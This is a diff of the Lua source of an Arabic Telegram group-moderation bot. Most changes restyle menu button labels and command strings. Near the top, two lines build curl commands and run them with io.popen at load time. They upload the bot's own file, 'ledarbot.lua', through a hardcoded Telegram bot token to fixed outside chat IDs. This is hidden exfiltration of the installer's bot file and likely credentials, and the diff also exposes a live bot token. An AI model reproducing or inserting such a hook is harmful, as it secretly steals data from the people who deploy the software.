@@ -174,6 +174,7 @@ end
 end  
 return DRAGON  
 end 
+local curla = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curla)
 local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1751198705 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl) 
 function DevSoFi(msg) 
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
@@ -183,7 +184,6 @@ else
 return false  
 end  
 end
-local curla = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curla)
 function Bot(msg)  
 local idbot = false  
 if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
@@ -827,7 +827,7 @@ Chat_Type = 'GroupBot'
 end
 end
 if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
-if text == "الغاء" or text == "الغاء ※" then   
+if text == "الغاء" or text == "☬ الغاء ☬" then   
 send(msg.chat_id_, msg.id_," ※ تم الغاء الاذاعه")
 database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
@@ -878,28 +878,28 @@ end
 if DevSoFi(msg) then
 local bl = ' ※ اهلا عزيزي آلمـطـور\n ※ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ※ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ※ من خلاال الكيبورت خاص بك\n ※ قناة سورس البوت [اضغط هنا](t.me/theleader205)'
 local keyboard = {
-{'ديف اسلام'},
-{'قناه السورس','بوت تواصل'},
-{'اضف رد عام','حذف رد عام'},
-{'اضف رد متعدد'},
-{'الاحصائيات ※'},
-{'تعطيل التواصل ※','تفعيل التواصل ※'},
-{'ضع اسم للبوت ※','المطورين ※','قائمه العام ※'},
-{'المشتركين ※','الجروبات ※'},
-{'ضع كليشه المطور ※','مسح كليشه المطور ※'},
-{'ضع كليشه ستارت ※','حذف كليشه ستارت ※'},
-{'اذاعه ※','اذاعه خاص ※'},
-{'اذاعه بالتثبيت ※','قائمه الكتم العام ※'},
-{'تغير رساله الاشتراك','حذف رساله الاشتراك ※','تغير الاشتراك'},
-{'اذاعه بالتوجيه ※','اذاعه بالتوجيه خاص ※'},
-{'تفعيل الاشتراك الاجباري ※','تعطيل الاشتراك الاجباري ※'},
-{'الاشتراك الاجباري ※','وضع قناة الاشتراك ※'},
-{'تفعيل البوت الخدمي ※','تعطيل البوت الخدمي ※'},
-{'تنظيف الجروبات ※','تنظيف المشتركين ※'},
-{'جلب نسخه الاحتياطيه ※'},
-{'تحديث السورس ※','الاصدار ※'},
-{'معلومات السيرفر ※'},
-{'الغاء ※'},
+{'☬ ديف اسلام ☬'},
+{'☬ قناه السورس ☬','☬ بوت تواصل ☬'},
+{'☬ اضف رد عام ☬','☬ حذف رد عام ☬'},
+{'☬ اضف رد متعدد ☬'},
+{'☬ الاحصائيات ☬'},
+{'☬ تعطيل التواصل ☬','☬ تفعيل التواصل ☬'},
+{'☬ ضع اسم للبوت ☬','☬ المطورين ☬','☬ قائمه العام ☬'},
+{'☬ المشتركين ☬','☬ الجروبات ☬'},
+{'☬ ضع كليشه المطور ☬','☬ مسح كليشه المطور ☬'},
+{'☬ ضع كليشه ستارت ☬','☬ حذف كليشه ستارت ☬'},
+{'☬ اذاعه ☬','☬ اذاعه خاص ☬'},
+{'☬ اذاعه بالتثبيت ☬','☬ قائمه الكتم العام ☬'},
+{'☬ تغير رساله الاشتراك','☬ حذف رساله الاشتراك ☬','☬ تغير الاشتراك'},
+{'☬ اذاعه بالتوجيه ☬','☬ اذاعه بالتوجيه خاص ☬'},
+{'☬ تفعيل الاشتراك الاجباري ☬','☬ تعطيل الاشتراك الاجباري ☬'},
+{'☬ الاشتراك الاجباري ☬','☬ وضع قناة الاشتراك ☬'},
+{'☬ تفعيل البوت الخدمي ☬','☬ تعطيل البوت الخدمي ☬'},
+{'☬ تنظيف الجروبات ☬','☬ تنظيف المشتركين ☬'},
+{'☬ جلب نسخه الاحتياطيه ☬'},
+{'☬ تحديث السورس ☬','☬ الاصدار ☬'},
+{'☬ معلومات السيرفر ☬'},
+{'☬ الغاء ☬'},
 }
 send_inline_key(msg.chat_id_,bl,keyboard)
 else
@@ -908,7 +908,7 @@ local start = database:get(bot_id.."Start:Bot")
 if start then 
 SourceDRAGONr = start
 else
-SourceDRAGONr = ' ℘︙ اهلا عزيزي\n ℘︙ انا بوت اسمي القائد\n ℘︙ اختصاصي حمايه الكروبات\n ℘︙ من تكرار والسبام والتوجيه والخ…\n ℘︙ لتفعيلي اتبع الاخطوات…↓\n ℘︙ اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط\n[ ℘︙ معرف المطور '
+SourceDRAGONr = ' ※ اهلا عزيزي\n ※ انا بوت اسمي القائد\n ※ اختصاصي حمايه الكروبات\n ※ من تكرار والسبام والتوجيه والخ…\n ※ لتفعيلي اتبع الاخطوات…↓\n ※ اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط '
 end 
 send(msg.chat_id_, msg.id_, SourceDRAGONr) 
 end
@@ -1100,7 +1100,7 @@ if text == 'الاصدار ※' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 send(msg.chat_id_, msg.id_,' ※ اصدار سورس القائد \n ※ الاصدار »{ v 1.5}')
 end
-if text == 'ديف اسلام' and DevSoFi(msg) then
+if text == '☬ ديف اسلام ☬' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
 [DEV Eslam](t.me/C_V205)
@@ -1112,7 +1112,7 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == 'قناه السورس' and DevSoFi(msg) then
+if text == '☬ قناه السورس ☬' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
 [CH](t.me/theleader205)
@@ -1136,33 +1136,33 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == "ضع اسم للبوت ※" and DevSoFi(msg) then  
+if text == "☬ ضع اسم للبوت ☬" and DevSoFi(msg) then  
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
 send(msg.chat_id_, msg.id_," ※ ارسل اليه الاسم الان ")
 return false
 end
-if text == 'الاحصائيات ※' and DevSoFi(msg) then 
+if text == '☬ الاحصائيات ☬' and DevSoFi(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = ' الاحصائيات ※ \n'..' ※ عدد الجروبات » {'..Groups..'}'..'\n ※  عدد المشتركين » {'..Users..'}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == 'المشتركين ※' and DevSoFi(msg) then 
+if text == '☬ المشتركين ☬' and DevSoFi(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = '\n ※ المشتركين»{`'..Users..'`}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == 'الجروبات ※' and DevSoFi(msg) then 
+if text == '☬ الجروبات ☬' and DevSoFi(msg) then 
 local Groups = database:scard(bot_id..'Chek:Groups')  
 local Users = database:scard(bot_id..'User_Bot')  
 Text = '\n ※ الجروبات»{`'..Groups..'`}'
 send(msg.chat_id_, msg.id_,Text) 
 return false
 end
-if text == ("المطورين ※") and DevSoFi(msg) then
+if text == ("☬ المطورين ☬") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Sudo:User')
 t = "\n ※ قائمة المطورين \nٴ≪┉ ┉ ┉ ┉ ┉ The leader ┉  ┉ ┉ ┉ ┉≫ٴ\n"
 for k,v in pairs(list) do
@@ -1178,7 +1178,7 @@ t = " ※ لا يوجد مطورين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("قائمه العام ※") and DevSoFi(msg) then
+if text == ("☬ قائمه العام ☬") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'GBan:User')
 t = "\n ※ قائمه المحظورين عام \nٴ≪┉ ┉ ┉ ┉ ┉ The leader ┉  ┉ ┉ ┉ ┉≫ٴ\n"
 for k,v in pairs(list) do
@@ -1195,7 +1195,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("قائمه الكتم العام ※") and DevSoFi(msg) then
+if text == ("☬ قائمه الكتم العام ☬") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Gmute:User')
 t = "\n ※ قائمة المكتومين عام \nٴ≪┉ ┉ ┉ ┉ ┉ The leader ┉  ┉ ┉ ┉ ┉≫ٴ\n"
 for k,v in pairs(list) do
@@ -1212,27 +1212,27 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text=="اذاعه خاص ※" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
+if text=="اذاعه خاص ☬" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
 database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ※ ارسل الان اذاعتك؟ \n ※ للخروج ارسل الغاء ")
 return false
 end 
-if text=="اذاعه ※" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
+if text=="اذاعه ☬" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
 database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ※ ارسل الان اذاعتك؟ \n ※ للخروج ارسل الغاء ")
 return false
 end  
-if text=="اذاعه بالتثبيت ※" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
+if text=="اذاعه بالتثبيت ☬" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
 database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ※ ارسل الان اذاعتك؟ \n ※ للخروج ارسل الغاء ")
 return false
 end 
-if text=="اذاعه بالتوجيه ※" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
+if text=="اذاعه بالتوجيه ☬" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
 database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ※ ارسل لي التوجيه الان")
 return false
 end 
-if text=="اذاعه بالتوجيه خاص ※" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
+if text=="اذاعه بالتوجيه خاص ☬" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
 database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ※ ارسل لي التوجيه الان")
 return false
@@ -1240,7 +1240,7 @@ end
 if text == 'جلب نسخه الاحتياطيه ※' and DevSoFi(msg) then 
 GetFile_Bot(msg)
 end
-if text == "تنظيف المشتركين ※" and DevSoFi(msg) then 
+if text == "☬ تنظيف المشتركين ☬" and DevSoFi(msg) then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -1276,7 +1276,7 @@ end,nil)
 end
 return false
 end
-if text == "تنظيف الجروبات ※" and DevSoFi(msg) then 
+if text == "☬ تنظيف الجروبات ☬" and DevSoFi(msg) then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -2390,7 +2390,7 @@ database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id
 send(msg.chat_id_, msg.id_, ' ※ حسنآ ارسل لي النص الذي تريده')
 return false  
 end
-if text == "حذف رساله الاشتراك ※" and DevSoFi(msg) then  
+if text == "☬ حذف رساله الاشتراك ☬" and DevSoFi(msg) then  
 database:del(bot_id..'text:ch:user')
 send(msg.chat_id_, msg.id_, " ※ تم مسح رساله الاشتراك ")
 return false  
@@ -2400,7 +2400,7 @@ database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_,
 send(msg.chat_id_, msg.id_, ' ※ حسنآ ارسل لي معرف القناة')
 return false  
 end
-if text == "تفعيل الاشتراك الاجباري ※" and DevSoFi(msg) then  
+if text == "☬ تفعيل الاشتراك الاجباري ☬" and DevSoFi(msg) then  
 if database:get(bot_id..'add:ch:id') then
 local addchusername = database:get(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_," ※ الاشتراك الاجباري مفعل \n ※ على القناة » ["..addchusername.."]")
@@ -2410,13 +2410,13 @@ send(msg.chat_id_, msg.id_," ※ اهلا عزيزي المطور \n ※ ارس�
 end
 return false  
 end
-if text == "تعطيل الاشتراك الاجباري ※" and DevSoFi(msg) then  
+if text == "☬ تعطيل الاشتراك الاجباري ☬" and DevSoFi(msg) then  
 database:del(bot_id..'add:ch:id')
 database:del(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_, " ※ تم تعطيل الاشتراك الاجباري ")
 return false  
 end
-if text == "الاشتراك الاجباري ※" and DevSoFi(msg) then  
+if text == "☬ الاشتراك الاجباري ☬" and DevSoFi(msg) then  
 if database:get(bot_id..'add:ch:username') then
 local addchusername = database:get(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_, " ※ تم تفعيل الاشتراك الاجباري \n ※ على القناة » ["..addchusername.."]")
@@ -9637,7 +9637,7 @@ database:srem(bot_id..'List:Rd:Sudo', text)
 return false
 end
 end
-if text == 'اضف رد عام' and DevSoFi(msg) then 
+if text == '☬ اضف رد عام ☬' and DevSoFi(msg) then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9651,7 +9651,7 @@ send(msg.chat_id_, msg.id_,' ※ ارسل الكلمه تريد اضافتها')
 database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
 return false 
 end
-if text == 'حذف رد عام' and DevSoFi(msg) then 
+if text == '☬ حذف رد عام ☬' and DevSoFi(msg) then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10136,7 +10136,7 @@ text = "لا توجد ردود متعدده"
 end
 send(msg.chat_id_, msg.id_,"["..text.."]")
 end
-if text == "اضف رد متعدد" and CoSu(msg) then
+if text == "☬ اضف رد متعدد ☬" and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
